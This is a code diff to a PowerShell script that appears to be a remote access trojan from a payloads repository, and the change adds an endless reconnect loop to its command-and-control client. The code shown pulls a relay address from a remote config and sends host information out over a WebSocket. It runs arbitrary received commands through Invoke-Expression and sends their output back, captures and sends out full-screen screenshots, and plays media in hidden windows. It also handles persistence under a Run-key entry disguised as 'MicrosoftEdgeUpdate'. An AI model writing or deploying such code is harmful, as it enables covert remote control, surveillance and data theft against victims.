@@ -101,59 +101,61 @@ $infos = @{
 
 $json = $infos | ConvertTo-Json
 
-$ws = New-Object System.Net.WebSockets.ClientWebSocket
+while ($true) {
+    try {
+        $ws = New-Object System.Net.WebSockets.ClientWebSocket
 
-$configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
-$config = Invoke-RestMethod -Uri $configUrl
-$uri = [System.Uri]"$($config.relay_url)/ws"
+        $configUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/config.json"
+        $config = Invoke-RestMethod -Uri $configUrl
+        $uri = [System.Uri]"$($config.relay_url)/ws"
 
-$token = [System.Threading.CancellationToken]::None
+        $token = [System.Threading.CancellationToken]::None
 
-$task = $ws.ConnectAsync($uri, $token)
-$task.Wait()
+        $task = $ws.ConnectAsync($uri, $token)
+        $task.Wait()
 
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
-$segment = [System.ArraySegment[byte]]::new($bytes)
-$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+        $segment = [System.ArraySegment[byte]]::new($bytes)
+        $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
 
-$buffer = [byte[]]::new(1048576)
-$segment = [System.ArraySegment[byte]]::new($buffer)
+        $buffer = [byte[]]::new(1048576)
+        $segment = [System.ArraySegment[byte]]::new($buffer)
 
-while ($ws.State -eq "Open") {
-    $result = $ws.ReceiveAsync($segment, $token)
-    $result.Wait()
-    $message = [System.Text.Encoding]::UTF8.GetString($segment.Array, 0, $result.Result.Count)
-    
-    if ($message.Trim() -ne "") {
-        try {
-            $cmd = $message | ConvertFrom-Json
+        while ($ws.State -eq "Open") {
+            $result = $ws.ReceiveAsync($segment, $token)
+            $result.Wait()
+            $message = [System.Text.Encoding]::UTF8.GetString($segment.Array, 0, $result.Result.Count)
+            
+            if ($message.Trim() -ne "") {
+                try {
+                    $cmd = $message | ConvertFrom-Json
 
-            if ($cmd.type -eq "play_video" -or $cmd.type -eq "play_sound") {
-                if ($cmd.type -eq "play_video") {
-                    $mode = "video"
-                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp4"
-                } else {
-                    $mode = "sound"
-                    $filePath = Join-Path $scriptDir "media\$($cmd.file).mp3"
-                }
+                    if ($cmd.type -eq "play_video" -or $cmd.type -eq "play_sound") {
+                        if ($cmd.type -eq "play_video") {
+                            $mode = "video"
+                            $filePath = Join-Path $scriptDir "media\$($cmd.file).mp4"
+                        } else {
+                            $mode = "sound"
+                            $filePath = Join-Path $scriptDir "media\$($cmd.file).mp3"
+                        }
 
-                Start-Process python -ArgumentList "$playerPath --file `"$filePath`" --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
-            }
+                        Start-Process python -ArgumentList "$playerPath --file `"$filePath`" --duration $($cmd.duration) --volume $($cmd.volume) --mode $mode" -WindowStyle Hidden
+                    }
 
-            elseif ($cmd.type -eq "kill") {
-                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-                if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
-                    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
-                }
-                Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
-                exit
-            }
+                    elseif ($cmd.type -eq "kill") {
+                        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+                        if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
+                            Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
+                        }
+                        Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
+                        exit
+                    }
 
-            elseif ($cmd.type -eq "screenshot") {
-                Add-Type -AssemblyName System.Windows.Forms
-                Add-Type -AssemblyName System.Drawing
-                if (-not ([System.Management.Automation.PSTypeName]'DPI').Type) {
-                    Add-Type -TypeDefinition @"
+                    elseif ($cmd.type -eq "screenshot") {
+                        Add-Type -AssemblyName System.Windows.Forms
+                        Add-Type -AssemblyName System.Drawing
+                        if (-not ([System.Management.Automation.PSTypeName]'DPI').Type) {
+                            Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class DPI {
@@ -161,44 +163,49 @@ public class DPI {
     public static extern bool SetProcessDPIAware();
 }
 "@
-                }
-                [DPI]::SetProcessDPIAware()
+                        }
+                        [DPI]::SetProcessDPIAware()
 
-                $bounds = [System.Drawing.Rectangle]::Empty
-                foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
-                    $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.Bounds)
-                }
-                $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+                        $bounds = [System.Drawing.Rectangle]::Empty
+                        foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
+                            $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.Bounds)
+                        }
+                        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+                        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
 
-                $ms = New-Object System.IO.MemoryStream
-                $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
-                $bytes = $ms.ToArray()
-                $base64 = [Convert]::ToBase64String($bytes)
-                $chunkSize = 500000
-                $chunks = [Math]::Ceiling($base64.Length / $chunkSize)
+                        $ms = New-Object System.IO.MemoryStream
+                        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+                        $bytes = $ms.ToArray()
+                        $base64 = [Convert]::ToBase64String($bytes)
+                        $chunkSize = 500000
+                        $chunks = [Math]::Ceiling($base64.Length / $chunkSize)
 
-                for ($i = 0; $i -lt $chunks; $i++) {
-                    $chunk = $base64.Substring($i * $chunkSize, [Math]::Min($chunkSize, $base64.Length - $i * $chunkSize))
-                    $payload = @{ 
-                        type = "screenshot_chunk"
-                        data = $chunk
-                        index = $i
-                        total = $chunks
-                    } | ConvertTo-Json
-                    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
-                    $payloadSegment = [System.ArraySegment[byte]]::new($payloadBytes)
-                    $ws.SendAsync($payloadSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
+                        for ($i = 0; $i -lt $chunks; $i++) {
+                            $chunk = $base64.Substring($i * $chunkSize, [Math]::Min($chunkSize, $base64.Length - $i * $chunkSize))
+                            $payload = @{ 
+                                type = "screenshot_chunk"
+                                data = $chunk
+                                index = $i
+                                total = $chunks
+                            } | ConvertTo-Json
+                            $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+                            $payloadSegment = [System.ArraySegment[byte]]::new($payloadBytes)
+                            $ws.SendAsync($payloadSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
+                        }
+                    }
+
+                } catch {
+                    $output = Invoke-Expression $message
+                    $outputString = $output | Out-String
+                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($outputString)
+                    $segment_out = [System.ArraySegment[byte]]::new($bytes)
+                    $ws.SendAsync($segment_out, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
                 }
             }
-
-        } catch {
-            $output = Invoke-Expression $message
-            $outputString = $output | Out-String
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($outputString)
-            $segment_out = [System.ArraySegment[byte]]::new($bytes)
-            $ws.SendAsync($segment_out, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $token).Wait()
         }
+    } catch {
+        
     }
+    Start-Sleep -Seconds 10
 }
